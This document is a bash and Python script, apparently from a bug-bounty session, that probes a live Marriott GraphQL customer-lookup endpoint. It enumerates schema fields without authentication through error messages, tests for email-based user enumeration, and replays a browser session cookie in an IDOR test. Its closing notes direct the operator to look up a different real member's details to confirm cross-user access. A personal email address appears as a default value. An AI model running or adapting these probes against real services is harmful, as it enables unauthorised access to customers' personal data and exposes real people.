#!/usr/bin/env bash
# Session 24f — Final IDOR test for lookupCustomerProfiles
#
# KEY FIX: Use real variables (no $dummy). Apollo short-circuits field
# validation when $dummy is unused, causing false "EXISTS" for all fields.
# Real variables force full query body validation.
#
# LookupCustomerProfilesInput FULLY CONFIRMED:
#   { email: String!, firstName: String!, lastName: String!, country: String! }
# No additional fields (all 20 alternates returned "FIELD NOT IN SCHEMA").
# No safelisting on this operation (any query body passes).
#
# Date: 2026-06-25

set -eo pipefail
mkdir -p /tmp/s24f

OP='phoenixAccountLookupCustomerProfiles'
EP="https://auth-apc.marriott.com/mi/query/${OP}"

# Real variables declaration to force full Apollo validation
VARS_DECL='$email: String!, $firstName: String!, $lastName: String!, $country: String!'
VARS_DATA='{"email": "test@nowhere-invalid.test", "firstName": "Test", "lastName": "User", "country": "US"}'
VARS_OWN_DATA="{\"email\": \"${OWN_EMAIL:-zahinshahriar3@gmail.com}\", \"firstName\": \"${OWN_FNAME:-True}\", \"lastName\": \"${OWN_LNAME:-Tester}\", \"country\": \"${OWN_COUNTRY:-US}\"}"
INPUT_INLINE='email: $email, firstName: $firstName, lastName: $lastName, country: $country'

echo "========================================================"
echo "SESSION 24f — lookupCustomerProfiles response + IDOR test"
echo "========================================================"
echo ""
echo "Input schema: { email: String!, firstName: String!, lastName: String!, country: String! }"
echo "No safelisting on this operation — sending real variables"

# ---------------------------------------------------------------
# PHASE A: Fixed response field enumeration
# Use real variables so Apollo validates full response type
# ---------------------------------------------------------------

echo ""
echo "======== PHASE A: Fixed response field enumeration ========"
echo "(Real variables — Apollo must validate response field names)"
echo ""

python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

# Base variables with real names — no $dummy
base_vars = {
    "email": "test@nowhere-invalid.test",
    "firstName": "Test",
    "lastName": "User",
    "country": "US"
}
vars_decl = "$email: String!, $firstName: String!, $lastName: String!, $country: String!"
input_inline = "email: $email, firstName: $firstName, lastName: $lastName, country: $country"

# Fields to probe — broad list
response_fields = [
    # Most likely for a lookup operation
    "customerProfiles",
    "matches",
    "members",
    "items",
    "results",
    "data",
    "profiles",        # known MISSING from S24d B1 — verify here
    # Singular (single result)
    "customerProfile",
    "member",
    "customer",
    "profile",
    # Metadata
    "total",
    "count",
    "totalCount",
    "found",
    "exists",
    "matched",
    # Status
    "status",
    "message",
    # Direct fields (flat response)
    "customerId",
    "altCustId",
    "loyaltyNumber",
    "memberId",
    "firstName",
    "lastName",
    "emailAddress",
]

exists = []
missing = []

print("Probing with REAL variables (no $dummy)...")
print("")

for field in response_fields:
    query_str = f"query {op}({vars_decl}) {{ lookupCustomerProfiles(input: {{{input_inline}}}) {{ {field} }} }}"
    payload = {
        "operationName": op,
        "variables": base_vars,
        "query": query_str
    }
    with open("/tmp/s24f/resp-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["curl","-s",ep,"-H","content-type: application/json",
         "-H","application-name: account","-d","@/tmp/s24f/resp-probe.json"],
        capture_output=True, text=True, timeout=15
    )
    body = r.stdout

    if f'Cannot query field "{field}"' in body:
        missing.append(field)
        status = "MISSING"
    elif "1012100" in body or "UNAUTHORIZED" in body:
        exists.append(field)
        status = "EXISTS + upstream 1012100 (resolver ran!)"
    elif "FORBIDDEN" in body or "signature mismatch" in body:
        status = "SAFELISTING BLOCKED"
    elif "required" in body and "not provided" in body:
        status = f"INPUT INCOMPLETE: {body[:80]}"
    elif "never used" in body:
        # This should NOT happen with real variables — flag it
        status = f"ORACLE BROKEN ($dummy issue): {body[:80]}"
    elif "is not an object" in body or "scalar" in body.lower() or "sub-selection" in body:
        exists.append(field)
        status = "EXISTS (scalar — no sub-selection needed)"
    elif "GRAPHQL_VALIDATION_FAILED" in body:
        # Some other validation error — field might exist, something else is wrong
        exists.append(field)
        status = f"GRAPHQL ERROR (field accepted): {body[:100]}"
    elif '"data"' in body:
        exists.append(field)
        status = f"DATA RESPONSE: {body[:200]}"
    else:
        status = f"OTHER: {body[:100]}"
    print(f"  response.{field}: {status}")

print(f"\n=== RESPONSE FIELDS EXIST: {exists}")
print(f"=== RESPONSE FIELDS MISSING: {missing}")

with open("/tmp/s24f/response-fields.json","w") as f:
    import json as j
    j.dump({"exists": exists, "missing": missing}, f, indent=2)
PYEOF

echo ""
echo "--- A2: Drill into existing collection fields ---"
python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

base_vars = {"email": "test@nowhere-invalid.test", "firstName": "Test", "lastName": "User", "country": "US"}
vars_decl = "$email: String!, $firstName: String!, $lastName: String!, $country: String!"
input_inline = "email: $email, firstName: $firstName, lastName: $lastName, country: $country"

# Load which top-level fields exist
try:
    with open("/tmp/s24f/response-fields.json") as f:
        resp_data = json.load(f)
    collection_candidates = resp_data.get("exists", [])
except:
    collection_candidates = ["customerProfiles", "members", "items", "results"]

if not collection_candidates:
    print("No response fields found in Phase A — skipping drill-down")
else:
    print(f"Drilling into: {collection_candidates}")
    print("")
    sub_fields = [
        "__typename", "id", "customerId", "altCustId",
        "loyaltyNumber", "memberId",
        "profile", "contactInformation", "loyaltyInformation",
        "firstName", "lastName", "emailAddress", "email",
        "name", "fullName",
    ]
    for parent in collection_candidates[:3]:
        print(f"\n--- Subfields of '{parent}' ---")
        for sub in sub_fields:
            query_str = f"query {op}({vars_decl}) {{ lookupCustomerProfiles(input: {{{input_inline}}}) {{ {parent} {{ {sub} }} }} }}"
            payload = {"operationName": op, "variables": base_vars, "query": query_str}
            with open("/tmp/s24f/sub-probe.json","w") as f:
                json.dump(payload, f)

            r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
                "-H","application-name: account","-d","@/tmp/s24f/sub-probe.json"],
                capture_output=True, text=True, timeout=15)
            body = r.stdout

            if f'Cannot query field "{sub}"' in body:
                status = "MISSING"
            elif "1012100" in body or "UNAUTHORIZED" in body:
                status = "EXISTS (upstream 1012100)"
            elif "is not an object" in body or "scalar" in body.lower():
                status = f"PARENT IS SCALAR"
            elif "GRAPHQL_VALIDATION_FAILED" in body and "never used" not in body:
                status = f"SCHEMA ERROR: {body[:80]}"
            elif '"data"' in body:
                status = f"DATA: {body[:200]}"
            else:
                status = f"OTHER: {body[:80]}"
            print(f"  {parent}.{sub}: {status}")
PYEOF


# ---------------------------------------------------------------
# PHASE B: Unauthenticated lookup — does it return any data?
# Test with own email AND a non-matching email
# Compare responses to understand server behavior
# ---------------------------------------------------------------

echo ""
echo "======== PHASE B: Unauthenticated behavior test ========"
echo ""

OWN_EMAIL_VAL="${OWN_EMAIL:-zahinshahriar3@gmail.com}"
OWN_FNAME_VAL="${OWN_FNAME:-True}"
OWN_LNAME_VAL="${OWN_LNAME:-Tester}"
OWN_COUNTRY_VAL="${OWN_COUNTRY:-US}"

echo "--- B1: Unauthenticated lookup with own email ---"
python3 << 'PYEOF'
import json, subprocess, os

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

email = os.environ.get("OWN_EMAIL", "zahinshahriar3@gmail.com")
fname = os.environ.get("OWN_FNAME", "True")
lname = os.environ.get("OWN_LNAME", "Tester")
country = os.environ.get("OWN_COUNTRY", "US")

vars_decl = "$email: String!, $firstName: String!, $lastName: String!, $country: String!"
input_inline = "email: $email, firstName: $firstName, lastName: $lastName, country: $country"
base_vars = {"email": email, "firstName": fname, "lastName": lname, "country": country}

# Load known response fields from Phase A
try:
    with open("/tmp/s24f/response-fields.json") as f:
        resp_data = json.load(f)
    fields = resp_data.get("exists", [])[:3]
except:
    fields = []

resp_selection = " ".join(fields) if fields else "__typename"

query_str = f"query {op}({vars_decl}) {{ lookupCustomerProfiles(input: {{{input_inline}}}) {{ {resp_selection} }} }}"
payload = {"operationName": op, "variables": base_vars, "query": query_str}
with open("/tmp/s24f/b1-own.json","w") as f:
    json.dump(payload, f)

r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
    "-H","application-name: account","-d","@/tmp/s24f/b1-own.json",
    "-w","\nHTTP %{http_code} | %{size_download}B"],
    capture_output=True, text=True, timeout=15)

print(f"B1 - Unauthenticated, own email ({email}):")
print(r.stdout[:1000])
with open("/tmp/s24f/b1-own-out.txt","w") as f:
    f.write(r.stdout)
PYEOF

echo ""
echo "--- B2: Unauthenticated lookup with fake email ---"
python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

vars_decl = "$email: String!, $firstName: String!, $lastName: String!, $country: String!"
input_inline = "email: $email, firstName: $firstName, lastName: $lastName, country: $country"
fake_vars = {"email": "nobody-fake-xzy123@invalid-domain-xyz.test", "firstName": "Nobody", "lastName": "Fake", "country": "US"}

try:
    with open("/tmp/s24f/response-fields.json") as f:
        resp_data = json.load(f)
    fields = resp_data.get("exists", [])[:3]
except:
    fields = []
resp_selection = " ".join(fields) if fields else "__typename"

query_str = f"query {op}({vars_decl}) {{ lookupCustomerProfiles(input: {{{input_inline}}}) {{ {resp_selection} }} }}"
payload = {"operationName": op, "variables": fake_vars, "query": query_str}
with open("/tmp/s24f/b2-fake.json","w") as f:
    json.dump(payload, f)

r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
    "-H","application-name: account","-d","@/tmp/s24f/b2-fake.json",
    "-w","\nHTTP %{http_code} | %{size_download}B"],
    capture_output=True, text=True, timeout=15)

print(f"B2 - Unauthenticated, fake email:")
print(r.stdout[:1000])
with open("/tmp/s24f/b2-fake-out.txt","w") as f:
    f.write(r.stdout)

print("")
print("COMPARE B1 vs B2:")
b1 = open("/tmp/s24f/b1-own-out.txt").read()
b2 = r.stdout
if len(b1) == len(b2):
    print("  SAME SIZE → No differential (no user enumeration possible unauthenticated)")
else:
    print(f"  DIFFERENT SIZE: B1={len(b1)}B, B2={len(b2)}B → DIFFERENTIAL EXISTS")
    print("  → Could indicate user enumeration or different response paths")
PYEOF


# ---------------------------------------------------------------
# PHASE C: Authenticated IDOR test
# ---------------------------------------------------------------

echo ""
echo "======== PHASE C: Authenticated IDOR test ========"

if [ -f "/tmp/s24d/cs.txt" ]; then
    COOKIES=$(cat /tmp/s24d/cs.txt)
    echo "Cookie file found."
    echo ""

    echo "--- C1: Authenticated self-lookup ---"
    python3 << 'PYEOF'
import json, subprocess, os

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

own_email = os.environ.get("OWN_EMAIL", "zahinshahriar3@gmail.com")
own_fname = os.environ.get("OWN_FNAME", "True")
own_lname = os.environ.get("OWN_LNAME", "Tester")
own_country = os.environ.get("OWN_COUNTRY", "US")
cookies = open("/tmp/s24d/cs.txt").read().strip()

vars_decl = "$email: String!, $firstName: String!, $lastName: String!, $country: String!"
input_inline = "email: $email, firstName: $firstName, lastName: $lastName, country: $country"
own_vars = {"email": own_email, "firstName": own_fname, "lastName": own_lname, "country": own_country}

# Load known response fields
try:
    with open("/tmp/s24f/response-fields.json") as f:
        resp_data = json.load(f)
    fields = resp_data.get("exists", [])[:5]
except:
    fields = []
resp_selection = " ".join(fields) if fields else "__typename"

query_str = f"query {op}({vars_decl}) {{ lookupCustomerProfiles(input: {{{input_inline}}}) {{ {resp_selection} }} }}"
payload = {"operationName": op, "variables": own_vars, "query": query_str}
with open("/tmp/s24f/c1-auth.json","w") as f:
    json.dump(payload, f)

r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
    "-H","application-name: account","-H",f"cookie: {cookies}",
    "-d","@/tmp/s24f/c1-auth.json","-w","\nHTTP %{http_code} | %{size_download}B"],
    capture_output=True, text=True, timeout=15)

print(f"C1 - Authenticated self-lookup ({own_email}):")
print(r.stdout[:2000])
with open("/tmp/s24f/c1-auth-out.txt","w") as f:
    f.write(r.stdout)

body = r.stdout
if "1012100" in body:
    print("\n→ 1012100 — upstream auth still failing for this operation too")
    print("→ Same auth context issue as customer(id:...) — LookupCustomerProfiles uses same upstream")
elif "FORBIDDEN" in body:
    print("\n→ Safelisting blocked")
elif '"data"' in body and '"null"' not in body[:200]:
    print("\n→ DATA RETURNED — lookup worked!")
    print("→ NEXT: Run cross-user test (C2)")
elif "required" in body and "not provided" in body:
    import re
    m = re.search(r'Field "LookupCustomerProfilesInput\.(\w+)" of required', body)
    print(f"\n→ MORE required input: {m.group(1) if m else 'unknown'}")
    print("→ Try: OWN_COUNTRY='BD' or other country code matching your registration")
else:
    print(f"\n→ UNEXPECTED: {body[:200]}")
PYEOF

else
    echo "No cookie file at /tmp/s24d/cs.txt"
    echo ""
    echo "To capture cookies:"
    echo "  1. Log in to www.marriott.com in browser"
    echo "  2. Go to /loyalty/myAccount/default.mi"
    echo "  3. Open Network tab (F12)"
    echo "  4. Click any /mi/query/ request"
    echo "  5. In Request Headers, copy the 'cookie:' value (the long string)"
    echo "  6. On Pi: echo 'PASTE_HERE' > /tmp/s24d/cs.txt"
    echo "  7. Re-run this script"
fi


echo ""
echo "======== SESSION 24f COMPLETE ========"
echo ""
echo "=== WHAT TO LOOK FOR ==="
echo ""
echo "Phase A — RESPONSE FIELDS:"
echo "  'EXISTS + upstream 1012100' → field is real, resolver runs, auth needed"
echo "  'MISSING' → field not on LookupCustomerProfilesResponse"
echo "  'DATA RESPONSE' → resolver works WITHOUT auth (Critical!)"
echo ""
echo "Phase B — DIFFERENTIAL:"
echo "  DIFFERENT sizes → request behavior differs by email (at least user enumeration)"
echo "  SAME sizes → no differential (identical handling regardless of email)"
echo ""
echo "Phase C — AUTH TEST:"
echo "  '1012100' → same auth issue, LookupCustomerProfiles uses upl-customer too"
echo "  'DATA RETURNED' → IDOR test path open → run cross-user test"
echo ""
echo "If C1 returns data: cross-user test query:"
echo "  Change email+firstName+lastName to a DIFFERENT real Marriott member"
echo "  If that returns data → IDOR CONFIRMED → CRITICAL"
